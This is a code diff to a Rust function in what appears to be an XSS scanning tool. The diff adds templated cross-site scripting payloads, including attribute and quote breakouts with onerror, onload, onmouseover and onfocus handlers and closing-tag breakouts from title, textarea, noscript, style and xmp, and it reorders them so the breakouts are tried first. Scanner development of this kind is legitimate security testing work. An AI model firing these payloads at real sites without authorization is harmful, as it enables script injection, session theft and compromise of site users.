@@ -13,7 +13,24 @@ pub fn useful_html_tag_names() -> &'static [&'static str] {
 
 pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     let templates = [
-        // CLASS
+        // Attribute breakout first — ensures these are tried before standard HTML payloads.
+        // Standard HTML payloads reflect inside quoted attributes as false-positive R,
+        // blocking the breakout payloads that follow (first R per param wins).
+        "'><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "\"><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "'><sVg onload={JS} claSS={CLASS}>",
+        "\"><sVg onload={JS} claSS={CLASS}>",
+        "' onerror={JS} class={CLASS} src=x '",
+        "\" onerror={JS} class={CLASS} src=x \"",
+        "' onmouseover={JS} class={CLASS} '",
+        "\" onmouseover={JS} class={CLASS} \"",
+        "' onfocus={JS} autofocus class={CLASS} '",
+        "\" onfocus={JS} autofocus class={CLASS} \"",
+        "'><IMG src=x onerror={JS} id={ID}>",
+        "\"><IMG src=x onerror={JS} id={ID}>",
+        "'><sVg onload={JS} iD={ID}>",
+        "\"><sVg onload={JS} iD={ID}>",
+        // Standard HTML injection (body / unquoted / direct contexts)
         "<IMG src=x onerror={JS} ClAss={CLASS}>",
         "<sVg onload={JS} claSS={CLASS}>",
         "<sCrIpt/cLaSs={CLASS}>{JS}</scRipT>",
@@ -25,11 +42,20 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "<IMG\nsrc=x\nonerror={JS}\nClAss={CLASS}>",
         "<sVg\nonload={JS}\nclaSS={CLASS}>",
         "<IMG\tsrc=x\tonerror={JS}\tClAss={CLASS}>",
-        // ID
+        // Safe-tag breakout (title, textarea, noscript, style, xmp)
+        "</title><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "</textarea><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "</noscript><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "</style><IMG src=x onerror={JS} ClAss={CLASS}>",
+        "</xmp><IMG src=x onerror={JS} ClAss={CLASS}>",
+        // ID variants
         "<IMG src=x onerror={JS} id={ID}>",
         "<sVg onload={JS} iD={ID}>",
         "<sCrIpt/ID={ID}>{JS}</scRipT>",
         "<IMG\nsrc=x\nonerror={JS}\nid={ID}>",
+        "</title><IMG src=x onerror={JS} id={ID}>",
+        "</textarea><IMG src=x onerror={JS} id={ID}>",
+        "</noscript><IMG src=x onerror={JS} id={ID}>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
